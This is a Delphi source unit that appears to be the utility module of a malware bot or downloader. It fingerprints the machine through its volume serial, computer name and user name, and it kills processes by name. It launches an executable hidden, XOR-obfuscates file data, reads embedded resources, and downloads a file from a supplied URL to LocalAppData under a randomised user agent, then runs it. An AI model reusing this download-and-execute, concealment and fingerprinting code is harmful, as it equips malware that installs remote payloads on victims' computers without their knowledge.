unit untUtils;
{$WARNINGS OFF}
interface

uses WinInet, shfolder, shellapi, Windows, uconfig, untRegistry, System.Classes,tlHelp32;

type
  TByteArray = array of Byte;

function ReadResource(strResID: String; var lResLen: Integer): Pointer;
function DirectoryExists(const Directory: string): Boolean;
function GetCurrentDir: string;
function ownTrim(strData: String): String;
function ParseDownload(sString: String): Boolean;
function IsNumeric(value: string): Boolean;
function LocalAppDataPath: string;
function IsVista7: Boolean;
function IntToStr(Int: Integer): string;
function LowerCase(const S: string): string;
function ReadFileData(strPath: String; var lSize: Cardinal): Pointer;
function LastDelimiter(S: String; Delimiter: Char): Integer;
function StringFromCLSID(const clsid: TGUID; out psz: PWideChar): HResult; stdcall; external 'ole32.dll' name 'StringFromCLSID';
procedure EncryptFile(pPointer: Pointer; lLen: Integer);
procedure CoTaskMemFree(pv: Pointer); stdcall; external 'ole32.dll' name 'CoTaskMemFree';
function getHWID(): String;
function ComputerName: String;
Function GetUserFromWindows: string;
function IsWow64: Boolean;
function DownloadFile(url, destinationFileName, destinationFolder: string): Boolean;
function DownloadFiles(const url: string; const destinationFileName: string): boolean;
Function StartPrxyHidden(sPath:string):boolean;
function processExists(exeFileName: string): Boolean;
function KillTask(ExeFileName: string): Integer;

implementation

uses Sysutils;

function KillTask(ExeFileName: string): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then
      Result := Integer(TerminateProcess(
                        OpenProcess(PROCESS_TERMINATE,
                                    BOOL(0),
                                    FProcessEntry32.th32ProcessID),
                                    0));
     ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;


function processExists(exeFileName: string): Boolean;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  Result := False;
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then
    begin
      Result := True;
    end;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;


Function StartPrxyHidden(sPath:string):boolean;
begin
  If ShellExecute(0,nil,Pchar(sPath),nil,nil,SW_HIDE) > 32 then
    Result := True;
end;


function IsWow64: Boolean;
type
  TIsWow64Process = function(Handle: Windows.THandle; var Res: Windows.BOOL): Windows.BOOL; stdcall;
var
  IsWow64Result: Windows.BOOL;
  IsWow64Process: TIsWow64Process;
begin
  IsWow64Process := Windows.GetProcAddress(Windows.GetModuleHandle('kernel32'), 'IsWow64Process');
  if Assigned(IsWow64Process) then
  begin
    if not IsWow64Process(Windows.GetCurrentProcess, IsWow64Result) then
      raise SysUtils.Exception.Create('IsWow64: bad process handle');
    Result := IsWow64Result;
  end
  else
    Result := False;
end;

Function GetUserFromWindows: string;
Var
   UserName : string;
   UserNameLen : Dword;
Begin
   UserNameLen := 255;
   SetLength(userName, UserNameLen) ;
   If GetUserName(PChar(UserName), UserNameLen) Then
     Result := Copy(UserName,1,UserNameLen - 1)
   Else
     Result := 'Unknown';
End;


function ComputerName: String;
var
  Size: DWORD;
begin
  Size := MAX_COMPUTERNAME_LENGTH + 1;
  SetLength(Result, Size);
  if GetComputerName(PChar(Result), Size) then
    SetLength(Result, Size)
  else
    Result := '';
end;

function getHWID(): String;
var
SerialNum,A,B: DWord;
C: array [0..255] of Char;
Buffer: array [0..255] of Char;
begin
if GetVolumeInformation(pChar('C:\'), Buffer, 256, @SerialNum, A, B, C, 256) then
  Result := inttostr(SerialNum * Cardinal(-1))
else Result := '';
end;

function IntToStr(Int: Integer): string;
begin
  Str(Int, result);
end;

function ReadResource(strResID: String; var lResLen: Integer): Pointer;
var
  hResInfo: HRSRC;
  hRes: HGLOBAL;
begin
  Result := nil;
  hResInfo := FindResource(hInstance, PChar(strResID), RT_RCDATA);
  if hResInfo <> 0 then
  begin
    hRes := LoadResource(hInstance, hResInfo);
    if hRes <> 0 then
    begin
      result := LockResource(hRes);
      lResLen := SizeOfResource(hInstance, hResInfo);
    end;
  end;
end;

function ReadFileData(strPath: String; var lSize: Cardinal): Pointer;
var
  pFileHandle: Cardinal;
  lRead: Cardinal;
  pData: Pointer;
begin
  result := nil;
  pFileHandle := CreateFile(PChar(strPath), GENERIC_READ, 0, nil, OPEN_ALWAYS,
    FILE_ATTRIBUTE_NORMAL, 0);
  if pFileHandle <> INVALID_HANDLE_VALUE then
  begin
    lSize := GetFileSize(pFileHandle, nil);
    GetMem(pData, lSize);
    ReadFile(pFileHandle, pData^, lSize, lRead, nil);
    CloseHandle(pFileHandle);
    result := pData;
  end;
end;

procedure EncryptFile(pPointer: Pointer; lLen: Integer);
asm
  pushad
  mov eax, pPointer
  mov ecx, lLen
@loop:
  xor byte ptr[eax], 13
  inc eax
  dec ecx
  cmp ecx, 0
  jne @loop
  popad
end;

function LastDelimiter(S: String; Delimiter: Char): Integer;
var
  i: Integer;
begin
  result := -1;
  i := Length(S);
  if (S = '') or (i = 0) then
    Exit;
  while S[i] <> Delimiter do
  begin
    if i < 0 then
      break;
    dec(i);
  end;
  result := i;
end;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(result, L);
  Source := Pointer(S);
  Dest := Pointer(result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then
      inc(Ch, 32);
    Dest^ := Ch;
    inc(Source);
    inc(Dest);
    dec(L);
  end;
end;

function DirectoryExists(const Directory: string): Boolean;
var
  Code: Integer;
begin
  Code := GetFileAttributes(PChar(Directory));
  result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
end;

Function IsVista7: Boolean;
var
  osVerInfo: TOSVersionInfo;
  majorVer: Integer;
begin
  result := False;
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then
  begin
    majorVer := osVerInfo.dwMajorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT:
        begin
          if (majorVer = 6) then
            result := True;
        end;
    end;
  end;
end;

function GetComputerNetName: string;
var
  buffer: array [0 .. 255] of Char;
  size: dword;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    result := buffer
  else
    result := ''
end;


function ownTrim(strData: String): String;
var
  i: Integer;
begin
  result := '';
  for i := 1 to Length(strData) do
  begin
    if strData[i] = #0 then
    begin
      result := Copy(strData, 1, i - 1);
      break;
    end;
  end;
end;

function GetDate:String;
var
  SystemTime: TSystemTime;
begin
  GetLocalTime(SystemTime);
  Result := IntToStr(SystemTime.wSecond) + IntToStr(SystemTime.wMinute) + IntToStr(SystemTime.wHour)
            + IntToStr(SystemTime.wDay) + IntToStr(SystemTime.wMonth) + IntToStr(SystemTime.wYear);
end;

function LocalAppDataPath: string;
const
  SHGFP_TYPE_CURRENT = 0;
begin
  SetLength(result, MAX_PATH);
  SHGetFolderPathW(0, CSIDL_LOCAL_APPDATA, 0, SHGFP_TYPE_CURRENT, @result[1]);
  result := ownTrim(result);
  if result[Length(result)] <> '\' then
    result := result + '\';
end;

function GetCurrentDir: string;
begin
  GetDir(0, result);
  if result[Length(result)] <> '\' then
    result := result + '\';
end;

function IsNumeric(value: string): Boolean;
var
  i: Integer;
  tempChar: Char;
begin
  result := True;
  for i := 1 to Length(value) do
  begin
    tempChar := value[i];
    if (tempChar in ['0' .. '9']) = False then
    begin
      result := False;
    end;
  end;
end;

function DownloadFiles(const url: string; const destinationFileName: string): boolean;
var
  hInet: HINTERNET;
  hFile: HINTERNET;
  localFile: File;
  buffer: array[1..1024] of byte;
  bytesRead: DWORD;
begin
  result := False;
  hInet := InternetOpen(Pchar(UserAgents[Random(High(UserAgents) - 1) + 1]),INTERNET_OPEN_TYPE_PRECONFIG,nil,nil,0);
  hFile := InternetOpenURL(hInet,PChar(url),nil,0,INTERNET_FLAG_DONT_CACHE,0);
  if Assigned(hFile) then
  begin
    AssignFile(localFile,destinationFileName);
    Rewrite(localFile,1);
    repeat
      InternetReadFile(hFile,@buffer,SizeOf(buffer),bytesRead);
      BlockWrite(localFile,buffer,bytesRead);
    until bytesRead = 0;
    CloseFile(localFile);
    result := true;
    InternetCloseHandle(hFile);
  end;
  InternetCloseHandle(hInet);
end;


function DownloadFile(url, destinationFileName, destinationFolder
  : string): Boolean;
var
  hInet: HINTERNET;
  hFile: HINTERNET;
  pFileHandle, dWrite: Cardinal;
  buffer: array [1 .. 1024] of Byte;
  bytesRead: dword;
begin
  result := False;
  hInet := InternetOpen(PChar(UserAgents[Random(High(UserAgents) - 1) + 1]), INTERNET_OPEN_TYPE_PRECONFIG,
    nil, nil, 0);
  hFile := InternetOpenURL(hInet, PChar(url), nil, 0, 0, 0);
  if Assigned(hFile) then
  begin
    pFileHandle := CreateFileW(PChar(destinationFolder + destinationFileName), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if pFileHandle <> INVALID_HANDLE_VALUE then
    begin
      repeat
        InternetReadFile(hFile, @buffer, SizeOf(buffer), bytesRead);
        WriteFile(pFileHandle, buffer[1], bytesRead, dWrite, nil);
      until bytesRead = 0;
      CloseHandle(pFileHandle);
      if ShellExecuteW(0, nil, @destinationFileName[1], nil, @destinationFolder[1], SW_NORMAL) > 32 then
        result := True;
    end;
    InternetCloseHandle(hFile);
  end;
  InternetCloseHandle(hInet);
end;


function ParseDownload(sString: String): Boolean;
var
  sFile: String;
  lFilePos: Integer;
begin
  result := False;
  if sString <> '' then
  begin
    if LowerCase(Copy(sString, 1, 7)) <> 'http://' then
      sString := 'http://' + sString;
    lFilePos := LastDelimiter(sString, '/');
    if lFilePos <> 0 then
    begin
      sFile := Copy(sString, lFilePos + 1, Length(sString) - lFilePos + 1);
      if sFile <> '' then
      begin
        sFile := GetDate + sFile;
        result := DownloadFile(sString, sFile, LocalAppDataPath);
      end;
    end;
  end;
end;

end.
